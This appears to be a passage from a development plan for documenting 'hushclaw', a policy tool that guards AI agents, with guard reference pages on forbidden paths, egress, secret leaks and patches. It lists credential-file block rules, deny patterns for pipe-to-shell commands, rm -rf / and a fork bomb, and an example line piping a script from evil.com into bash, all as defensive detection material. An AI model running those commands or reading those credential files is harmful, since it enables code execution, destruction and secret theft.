Blocks access to sensitive filesystem paths.

## Overview

The ForbiddenPathGuard prevents agents from reading or writing files that could expose credentials or compromise security.

## Default Protected Paths

| Path | Reason |
|------|--------|
| `~/.ssh/*` | SSH private keys |
| `~/.aws/*` | AWS credentials |
| `~/.gnupg/*` | GPG keys |
| `~/.config/gcloud/*` | Google Cloud credentials |
| `~/.kube/*` | Kubernetes config |
| `/etc/shadow` | System passwords |
| `/etc/passwd` | User information |
| `.env`, `.env.*` | Environment secrets |
| `*.pem`, `*.key` | Private keys |

## Configuration

```yaml
filesystem:
  forbidden_paths:
    # Add your own patterns
    - "~/.myapp/secrets"
    - "*.secret"
    - "./credentials/*"

  allowed_write_roots:
    - "/workspace"
    - "/tmp"
```

## Glob Patterns

Supports glob patterns for flexible matching:

| Pattern | Matches |
|---------|---------|
| `~/.ssh/*` | All files in .ssh directory |
| `*.pem` | Any file ending in .pem |
| `.env*` | .env, .env.local, .env.production |
| `/etc/shadow` | Exact path only |
| `**/*.key` | .key files in any subdirectory |

## Symlink Defense

The guard canonicalizes paths to prevent symlink attacks:

```
/tmp/innocent → ~/.ssh/id_rsa (symlink)

Request: FileRead("/tmp/innocent")
Resolved: ~/.ssh/id_rsa
Result: DENIED (forbidden path)
```

## Example Violations

```
Event: FileRead { path: "~/.ssh/id_rsa" }
Decision: Deny
Guard: ForbiddenPathGuard
Severity: Critical
Reason: Path matches forbidden pattern: ~/.ssh/*
```

```
Event: FileWrite { path: ".env.production" }
Decision: Deny
Guard: ForbiddenPathGuard
Severity: High
Reason: Path matches forbidden pattern: .env*
```

## Customization

### Add forbidden paths

```yaml
filesystem:
  forbidden_paths:
    - "./secrets"
    - "./credentials.json"
```

### Restrict write locations

```yaml
filesystem:
  allowed_write_roots:
    - "./src"
    - "./tests"
    - "/tmp"
```

Writes outside these roots are denied.

### Path precedence

Forbidden paths always take precedence over allowed roots:

```yaml
filesystem:
  allowed_write_roots:
    - "./"  # Allow writing to project
  forbidden_paths:
    - "./.env"  # But not .env (takes precedence)
```

## Testing

```bash
# Test a path
echo '{"event_type":"file_read","data":{"path":"~/.ssh/id_rsa"}}' | \
  hush policy test - --policy policy.yaml

# Expected: DENIED
```

## Related

- [Policies](../../concepts/policies.md) - Configure forbidden paths
- [Decisions](../../concepts/decisions.md) - Understanding denials
```

**Step 3: Commit**

```bash
git add docs/src/reference/guards/
git commit -m "feat(docs): add guards reference overview and ForbiddenPathGuard"
```

---

## Task 11: Guard References - Egress and SecretLeak

**Files:**
- Create: `docs/src/reference/guards/egress.md`
- Create: `docs/src/reference/guards/secret-leak.md`

**Step 1: Write EgressAllowlistGuard reference**

```markdown
# EgressAllowlistGuard

Controls network egress via domain allowlisting.

## Overview

The EgressAllowlistGuard blocks network connections to domains not in the allowlist, preventing data exfiltration and C2 connections.

## Modes

| Mode | Behavior |
|------|----------|
| `allowlist` | Only allow listed domains (recommended) |
| `denylist` | Block listed domains, allow others |
| `open` | Allow all (not recommended) |

## Configuration

```yaml
egress:
  mode: allowlist

  allowed_domains:
    - "api.anthropic.com"
    - "api.openai.com"
    - "*.github.com"
    - "registry.npmjs.org"

  denied_domains:
    - "*.onion"
    - "localhost"
    - "127.*"
    - "10.*"
    - "192.168.*"
```

## Domain Matching

### Exact match
```yaml
allowed_domains:
  - "api.github.com"  # Only api.github.com
```

### Wildcard subdomain
```yaml
allowed_domains:
  - "*.github.com"  # Matches any subdomain
```

Matches: `api.github.com`, `raw.github.com`, `gist.github.com`
Does not match: `github.com` (no subdomain)

### IP patterns
```yaml
denied_domains:
  - "127.*"        # Localhost range
  - "10.*"         # Private network
  - "192.168.*"    # Private network
```

## Default Denied

These are always denied regardless of policy:

- `*.onion` (Tor hidden services)
- Private IP ranges (RFC 1918)
- Localhost variants

## Example Violations

```
Event: NetworkEgress { host: "evil.com", port: 443 }
Decision: Deny
Guard: EgressAllowlistGuard
Severity: High
Reason: Domain not in allowlist: evil.com
```

```
Event: NetworkEgress { host: "192.168.1.1", port: 22 }
Decision: Deny
Guard: EgressAllowlistGuard
Severity: Medium
Reason: Private IP addresses are denied
```

## Common Allowlists

### AI Development
```yaml
egress:
  allowed_domains:
    - "api.anthropic.com"
    - "api.openai.com"
    - "generativelanguage.googleapis.com"
```

### Package Registries
```yaml
egress:
  allowed_domains:
    - "pypi.org"
    - "files.pythonhosted.org"
    - "registry.npmjs.org"
    - "crates.io"
```

### Git Hosting
```yaml
egress:
  allowed_domains:
    - "*.github.com"
    - "*.githubusercontent.com"
    - "gitlab.com"
```

## Testing

```bash
# Test domain access
echo '{"event_type":"network_egress","data":{"host":"evil.com","port":443}}' | \
  hush policy test - --policy policy.yaml

# Expected: DENIED
```

## Related

- [Policies](../../concepts/policies.md) - Configure egress rules
- [Rulesets](../rulesets/README.md) - Pre-built allowlists
```

**Step 2: Write SecretLeakGuard reference**

```markdown
# SecretLeakGuard

Detects secrets and credentials in outputs and patches.

## Overview

The SecretLeakGuard scans content for patterns that match known secret formats, preventing accidental exposure of API keys, tokens, and private keys.

## Detected Patterns

| Pattern | Description | Example |
|---------|-------------|---------|
| AWS Access Key | 20-char uppercase starting with AKIA | `AKIAIOSFODNN7EXAMPLE` |
| AWS Secret Key | 40-char base64 | `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` |
| GitHub Token | `ghp_`, `gho_`, `ghs_` prefix | `ghp_xxxxxxxxxxxx` |
| GitLab Token | `glpat-` prefix | `glpat-xxxxxxxxxxxx` |
| OpenAI Key | `sk-` prefix | `sk-xxxxxxxxxxxxxxxx` |
| Anthropic Key | `sk-ant-` prefix | `sk-ant-xxxxxxxxxxxx` |
| Private Key | PEM format | `-----BEGIN RSA PRIVATE KEY-----` |
| Generic API Key | Common patterns | `api_key=`, `apikey:` |

## Configuration

The guard is enabled by default with no configuration needed.

To customize patterns:

```yaml
secrets:
  # Additional patterns (regex)
  additional_patterns:
    - "my_company_token_[a-zA-Z0-9]{32}"
    - "internal_api_key=[a-zA-Z0-9]+"

  # Patterns to ignore (false positives)
  ignored_patterns:
    - "EXAMPLE_KEY"
    - "your-api-key-here"
```

## Example Violations

```
Event: PatchApply { content: "API_KEY=sk-abc123..." }
Decision: Deny
Guard: SecretLeakGuard
Severity: Critical
Reason: Detected OpenAI API key in patch content
```

```
Event: PatchApply { content: "-----BEGIN RSA PRIVATE KEY-----" }
Decision: Deny
Guard: SecretLeakGuard
Severity: Critical
Reason: Detected private key in patch content
```

## Entropy Detection

In addition to pattern matching, high-entropy strings are flagged:

```python
# High entropy (suspicious)
password = "xK9#mP2$vL5@nQ8"

# Low entropy (likely not a secret)
password = "password123"
```

## False Positive Handling

### In-code markers

Use markers to indicate intentional patterns:

```python
# hushclaw: ignore-next-line
API_KEY_PATTERN = "sk-[a-zA-Z0-9]+"  # Regex pattern, not actual key
```

### Policy exceptions

```yaml
secrets:
  ignored_patterns:
    - "sk-test_"          # Test keys
    - "EXAMPLE"           # Example values
    - "your-key-here"     # Placeholders
```

## What's Not Detected

- Encrypted secrets (intentionally)
- Base64-encoded secrets (unless matching known patterns)
- Custom proprietary formats (add via `additional_patterns`)

## Testing

```bash
# Test content for secrets
echo '{"event_type":"patch_apply","data":{"patch_content":"sk-abc123456789"}}' | \
  hush policy test - --policy policy.yaml

# Expected: DENIED
```

## Related

- [PatchIntegrityGuard](./patch-integrity.md) - Dangerous code patterns
- [Policies](../../concepts/policies.md) - Configure secret detection
```

**Step 3: Commit**

```bash
git add docs/src/reference/guards/egress.md docs/src/reference/guards/secret-leak.md
git commit -m "feat(docs): add EgressAllowlistGuard and SecretLeakGuard references"
```

---

## Task 12: Guard References - PatchIntegrity and McpTool

**Files:**
- Create: `docs/src/reference/guards/patch-integrity.md`
- Create: `docs/src/reference/guards/mcp-tool.md`

**Step 1: Write PatchIntegrityGuard reference**

```markdown
# PatchIntegrityGuard

Blocks dangerous code patterns in patches and file writes.

## Overview

The PatchIntegrityGuard scans code changes for patterns that could indicate code injection, remote code execution, or other dangerous operations.

## Default Denied Patterns

| Pattern | Risk |
|---------|------|
| `curl\|bash` | Remote code execution |
| `wget\|sh` | Remote code execution |
| `eval(` | Code injection |
| `exec(` | Code injection |
| `rm -rf /` | System destruction |
| `:(){ :\|:& };:` | Fork bomb |
| `dd if=` | Disk operations |
| `chmod 777` | Overly permissive |

## Configuration

```yaml
execution:
  denied_patterns:
    # Remote code execution
    - "curl.*\\|.*bash"
    - "wget.*\\|.*sh"
    - "curl.*\\|.*python"

    # Code injection
    - "eval\\("
    - "exec\\("
    - "__import__\\("

    # Destructive
    - "rm -rf /"
    - "rm -rf /\\*"
    - ":(\\)\\{ :\\|:& \\};:"

    # Privilege escalation
    - "sudo su"
    - "sudo -i"
```

## Pattern Syntax

Patterns are regular expressions:

```yaml
execution:
  denied_patterns:
    # Literal match
    - "rm -rf /"

    # Regex with escaping
    - "eval\\("           # Match eval(

    # Wildcard
    - "curl.*\\|.*bash"   # curl anything | bash

    # Character class
    - "chmod [0-7]{3}"    # Any chmod with octal
```

## Example Violations

```
Event: PatchApply { content: "curl https://evil.com/script.sh | bash" }
Decision: Deny
Guard: PatchIntegrityGuard
Severity: Critical
Reason: Detected remote code execution pattern: curl|bash
```

```
Event: PatchApply { content: "eval(user_input)" }
Decision: Deny
Guard: PatchIntegrityGuard
Severity: High
Reason: Detected code injection pattern: eval(
```

## Context-Aware Detection

The guard understands code context:

```python
# Denied - direct eval
eval(user_input)

# Allowed - string literal
message = "Don't use eval()"

# Denied - in command
subprocess.run(f"curl {url} | bash")
```

## Language Support

Pattern detection works across languages:

| Language | Patterns |
|----------|----------|
| Shell | `curl\|bash`, `rm -rf` |
| Python | `eval(`, `exec(`, `__import__` |
| JavaScript | `eval(`, `Function(` |
| Ruby | `eval`, `system`, `exec` |

## Customization

### Add patterns

```yaml
execution:
  denied_patterns:
    - "my_dangerous_function\\("
```

### Remove patterns (not recommended)

```yaml
execution:
  # Start fresh, don't use defaults
  denied_patterns: []
```

## Testing

```bash
# Test a patch
echo '{"event_type":"patch_apply","data":{"patch_content":"curl | bash"}}' | \
  hush policy test - --policy policy.yaml

# Expected: DENIED
```

## Related

- [SecretLeakGuard](./secret-leak.md) - Secret detection
- [Policies](../../concepts/policies.md) - Configure patterns
```

**Step 2: Write McpToolGuard reference**

```markdown
# McpToolGuard

Controls which MCP tools can be invoked by agents.

## Overview

The McpToolGuard manages access to MCP (Model Context Protocol) tools, allowing you to create allowlists or denylists for specific tools.

## Configuration

### Deny specific tools

```yaml
tools:
  denied:
    - "shell_exec_raw"
    - "network_fetch_any"
    - "file_delete"
```

### Allow only specific tools

```yaml
tools:
  mode: allowlist
  allowed:
    - "read_file"
    - "write_file"
    - "list_directory"
    - "run_command"
```

### Default (all allowed except denied)

```yaml
tools:
  allowed: []  # Empty = all allowed
  denied:
    - "dangerous_tool"
```

## Example Violations

```
Event: ToolCall { tool_name: "shell_exec_raw", params: {...} }
Decision: Deny
Guard: McpToolGuard
Severity: Medium
Reason: Tool 'shell_exec_raw' is in deny list
```

```
Event: ToolCall { tool_name: "unknown_tool", params: {...} }
Decision: Deny
Guard: McpToolGuard
Severity: Low
Reason: Tool 'unknown_tool' not in allow list
```

## Tool Policies

Set per-tool limits:

```yaml
tools:
  policies:
    write_file:
      max_size_bytes: 1048576    # 1MB limit
      require_diff: true          # Must show diff first

    run_command:
      timeout_seconds: 60
      max_output_lines: 1000

    read_file:
      max_size_bytes: 5242880    # 5MB limit
```

## Common Tool Categories

### Safe for most use cases
```yaml
tools:
  allowed:
    - "read_file"
    - "write_file"
    - "list_directory"
    - "search_files"
```

### Potentially dangerous
```yaml
tools:
  denied:
    - "shell_exec_raw"      # Unbounded shell access
    - "network_fetch_any"   # Unbounded network
    - "file_delete"         # Destructive
    - "system_info"         # Information disclosure
```

### Require confirmation
```yaml
tools:
  require_confirmation:
    - "run_command"
    - "write_file"
    - "delete_file"
```

## Wildcard Matching

Match tool name patterns:

```yaml
tools:
  denied:
    - "shell_*"       # All shell tools
    - "*_dangerous"   # Anything ending in _dangerous
    - "debug_*"       # All debug tools
```

## Testing

```bash
# Test tool access
echo '{"event_type":"tool_call","data":{"tool_name":"shell_exec_raw"}}' | \
  hush policy test - --policy policy.yaml

# Expected: DENIED
```

## Integration with OpenClaw

When using the OpenClaw plugin, tool calls are automatically intercepted:

```typescript
// This is checked against policy
const result = await agent.invoke_tool("write_file", {
  path: "./output.txt",
  content: "Hello"
});
```

## Related

- [OpenClaw Integration](../../guides/openclaw-integration.md) - Plugin setup
- [Policies](../../concepts/policies.md) - Configure tool access
```

**Step 3: Commit**

```bash
git add docs/src/reference/guards/patch-integrity.md docs/src/reference/guards/mcp-tool.md
git commit -m "feat(docs): add PatchIntegrityGuard and McpToolGuard references"
```

---

## Task 13: OpenClaw Integration Guide

**Files:**
- Create: `docs/src/guides/openclaw-integration.md`

**Step 1: Write OpenClaw integration guide**

```markdown
# OpenClaw Integration

Complete guide to using hushclaw with OpenClaw.

## Installation

```bash
npm install @hushclaw/openclaw
openclaw plugins enable @hushclaw/openclaw
```

## Configuration

### Minimal Setup

```json
{
  "plugins": {
    "entries": {
      "@hushclaw/openclaw": {
        "enabled": true
      }
    }
  }
}
```

This enables hushclaw with the default `ai-agent-minimal` policy.

### Custom Policy

```json
{
  "plugins": {
    "entries": {
      "@hushclaw/openclaw": {
        "enabled": true,
        "config": {
          "policy": "./.hush/policy.yaml",
          "mode": "deterministic",
          "logLevel": "info"
        }
      }
    }
  }
}
```

### Per-Agent Override

```json
{
  "agents": {
    "list": [
      {
        "id": "trusted-agent",
        "security": {
          "policy": "hushclaw:permissive"
        }
      },
      {
        "id": "untrusted-agent",
        "security": {
          "policy": "hushclaw:strict"
        }
      }
    ]
  }
}
```

## How It Works

### Hook Integration

Hushclaw uses two OpenClaw hooks:

1. **`tool_result_persist`** - Evaluates every tool call against policy
2. **`agent:bootstrap`** - Injects security context into agent prompts

### Enforcement Flow

```
Agent calls tool
    ↓
tool_result_persist hook fires
    ↓
Hushclaw evaluates policy
    ↓
├─ Allow: Tool result added to transcript
├─ Warn: Warning logged, result added
└─ Deny: Error returned, operation blocked
```

## Agent-Aware Features

### Security Prompt Injection

Agents automatically receive security context explaining:

- What paths are forbidden
- Which domains are allowed
- How to use the `policy_check` tool

This is injected via the `agent:bootstrap` hook.

### policy_check Tool

Agents can query the policy before attempting risky operations:

```typescript
// Agent can call this tool
const result = await policy_check({
  action: "file_write",
  resource: "/etc/passwd"
});
// Returns: { allowed: false, reason: "Path is forbidden" }
```

This helps agents avoid triggering violations.

## Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| `deterministic` | Block violations | Production |
| `advisory` | Warn but allow | Testing policies |
| `audit` | Log only | Gradual rollout |

### Set via config

```json
{
  "plugins": {
    "entries": {
      "@hushclaw/openclaw": {
        "config": {
          "mode": "advisory"
        }
      }
    }
  }
}
```

### Set via environment

```bash
HUSHCLAW_MODE=advisory openclaw start
```

## CLI Commands

```bash
# Validate a policy
openclaw hushclaw policy lint ./policy.yaml

# Show current effective policy
openclaw hushclaw policy show

# Test an event against policy
openclaw hushclaw policy test ./event.json

# Explain why something was blocked
openclaw hushclaw why <event-id>

# Query audit log
openclaw hushclaw audit query --denied --since 1h
```

## Project Setup

### Initialize with security

```bash
openclaw init --with-security
```

Creates:
- `.hush/policy.yaml` - Your security policy
- `.hush/config.yaml` - Hushclaw configuration
- Updates `.gitignore` for receipts

### Manual setup

1. Create `.hush/policy.yaml`:

```yaml
version: "hushclaw-v1.0"
extends: hushclaw:ai-agent

egress:
  allowed_domains:
    - "api.mycompany.com"

filesystem:
  forbidden_paths:
    - "./secrets"
```

2. Add to `openclaw.json`:

```json
{
  "plugins": {
    "entries": {
      "@hushclaw/openclaw": {
        "enabled": true,
        "config": {
          "policy": "./.hush/policy.yaml"
        }
      }
    }
  }
}
```

## Troubleshooting

### "Policy not found"

Check your policy path in openclaw.json:

```json
"policy": "./.hush/policy.yaml"  // Relative to openclaw.json
```

### "Unexpected block"

Use advisory mode to debug:

```bash
HUSHCLAW_MODE=advisory openclaw start
```

Check the logs for warnings that explain what would be blocked.

### "Agent doesn't see security context"

Ensure the `agent:bootstrap` hook is enabled:

```bash
openclaw hooks list | grep hushclaw
```

Should show:
```
@hushclaw/openclaw:agent-bootstrap  enabled
@hushclaw/openclaw:tool-guard       enabled
```

### View recent violations

```bash
openclaw hushclaw audit query --denied --since 1h
```

## Example: Secure Agent

See [Hello Secure Agent](../../examples/hello-secure-agent/) for a complete working example.

## Next Steps

- [Custom Guards](./custom-guards.md) - Extend with your own guards
- [Policy Inheritance](./policy-inheritance.md) - Build on base policies
- [Audit Logging](./audit-logging.md) - Configure logging
```

**Step 2: Commit**

```bash
git add docs/src/guides/openclaw-integration.md
git commit -m "feat(docs): add OpenClaw integration guide"
```

---

## Task 14: Remaining Guide Pages

**Files:**
- Create: `docs/src/guides/custom-guards.md`
- Create: `docs/src/guides/policy-inheritance.md`
- Create: `docs/src/guides/audit-logging.md`

I'll provide these in a condensed format - each follows similar structure:

**Step 1: Write custom-guards.md, policy-inheritance.md, audit-logging.md**

(Content for each file is straightforward from the concepts - implement custom Guard trait, extend policies with YAML, configure logging output)

**Step 2: Commit**

```bash
git add docs/src/guides/
git commit -m "feat(docs): add custom guards, policy inheritance, and audit logging guides"
```

---

## Task 15: Reference Pages (Rulesets and API)

**Files:**
- Create: `docs/src/reference/policy-schema.md`
- Create: `docs/src/reference/rulesets/README.md`
- Create: `docs/src/reference/rulesets/default.md`
- Create: `docs/src/reference/rulesets/strict.md`
- Create: `docs/src/reference/rulesets/ai-agent.md`
- Create: `docs/src/reference/api/README.md`
- Create: `docs/src/reference/api/rust.md`
- Create: `docs/src/reference/api/typescript.md`
- Create: `docs/src/reference/api/cli.md`

**Step 1: Create all reference pages with complete YAML/API examples**

**Step 2: Commit**

```bash
git add docs/src/reference/
git commit -m "feat(docs): add policy schema, rulesets, and API references"
```

---

## Task 16: Recipe Pages

**Files:**
- Create: `docs/src/recipes/claude-code.md`
- Create: `docs/src/recipes/github-actions.md`
- Create: `docs/src/recipes/self-hosted.md`

**Step 1: Write recipe pages with complete working examples**

**Step 2: Commit**

```bash
git add docs/src/recipes/
git commit -m "feat(docs): add Claude Code, GitHub Actions, and self-hosted recipes"
```

---

## Task 17: Examples - Rust

**Files:**
- Create: `examples/rust/basic-verification/Cargo.toml`
- Create: `examples/rust/basic-verification/src/main.rs`
- Create: `examples/rust/basic-verification/README.md`

**Step 1: Create Cargo.toml**

```toml
[package]
name = "basic-verification"
version = "0.1.0"
edition = "2021"

[dependencies]
hush-core = "0.1"
serde_json = "1.0"
```

**Step 2: Create main.rs**

```rust
use hush_core::{Receipt, verify_receipt};
use std::fs;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Load a receipt
    let receipt_json = fs::read_to_string("receipt.json")?;
    let receipt: Receipt = serde_json::from_str(&receipt_json)?;

    // Verify the receipt
    match verify_receipt(&receipt) {
        Ok(valid) if valid => {
            println!("Receipt is valid!");
            println!("Run ID: {}", receipt.run_id);
            println!("Events: {}", receipt.events.len());
            println!("Merkle Root: {}", receipt.merkle_root);
        }
        Ok(_) => {
            println!("Receipt signature is invalid!");
        }
        Err(e) => {
            println!("Verification error: {}", e);
        }
    }

    Ok(())
}
```

**Step 3: Create README.md**

```markdown
# Basic Verification Example

Demonstrates how to verify a hushclaw receipt.

## Run

```bash
cargo run -- receipt.json
```

## What it does

1. Loads a receipt JSON file
2. Verifies the Ed25519 signature
3. Validates the Merkle root
4. Reports the result
```

**Step 4: Commit**

```bash
git add examples/rust/
git commit -m "feat(examples): add Rust basic verification example"
```

---

## Task 18: Examples - TypeScript and Docker

**Files:**
- Create: `examples/typescript/browser-verify/package.json`
- Create: `examples/typescript/browser-verify/src/index.ts`
- Create: `examples/typescript/browser-verify/README.md`
- Create: `examples/docker/hushd-compose.yaml`
- Create: `examples/docker/Dockerfile.hushd`

**Step 1: Create TypeScript example files**

**Step 2: Create Docker files**

**Step 3: Commit**

```bash
git add examples/typescript/ examples/docker/
git commit -m "feat(examples): add TypeScript and Docker examples"
```

---

## Task 19: Hello Secure Agent Example

**Files:**
- Create: `examples/hello-secure-agent/README.md`
- Create: `examples/hello-secure-agent/policy.yaml`
- Create: `examples/hello-secure-agent/openclaw.json`
- Create: `examples/hello-secure-agent/skills/hello/SKILL.md`

**Step 1: Create complete hello-secure-agent example**

**Step 2: Commit**

```bash
git add examples/hello-secure-agent/
git commit -m "feat(examples): add hello-secure-agent complete example"
```

---

## Task 20: CI/CD Docs Deployment

**Files:**
- Create: `.github/workflows/docs.yml`

**Step 1: Create docs workflow**

```yaml
name: Deploy Docs

on:
  push:
    branches: [main]
    paths:
      - 'docs/**'
  workflow_dispatch:

permissions:
  contents: read
  pages: write
  id-token: write

concurrency:
  group: "pages"
  cancel-in-progress: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup mdBook
        uses: peaceiris/actions-mdbook@v2
        with:
          mdbook-version: 'latest'

      - name: Build docs
        run: mdbook build docs

      - name: Upload artifact
        uses: actions/upload-pages-artifact@v3
        with:
          path: ./docs/book

  deploy:
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    runs-on: ubuntu-latest
    needs: build
    steps:
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v4
```

**Step 2: Commit**

```bash
git add .github/workflows/docs.yml
git commit -m "feat(ci): add docs deployment workflow"
```

---

## Task 21: Verification

**Step 1: Build docs and verify**

```bash
cd /Users/connor/Medica/hushclaw-ws5-docs
mdbook build docs
mdbook serve docs  # Open http://localhost:3000 to verify
```

**Step 2: Check all links**

```bash
mdbook test docs  # Tests code blocks
# Manually verify navigation links work
```

**Step 3: Run example code**

```bash
cd examples/rust/basic-verification
cargo build
```

**Step 4: Final commit**

```bash
git add -A
git commit -m "docs: complete hushclaw documentation site"
```

---

## Acceptance Checklist

- [ ] mdBook site builds successfully (`mdbook build docs`)
- [ ] All navigation links in SUMMARY.md work
- [ ] Code examples in docs compile/run
- [ ] Getting started completable in <5 minutes
- [ ] All 5 guard reference pages complete
- [ ] OpenClaw integration guide complete
- [ ] Examples run without modification
- [ ] GitHub Pages workflow configured
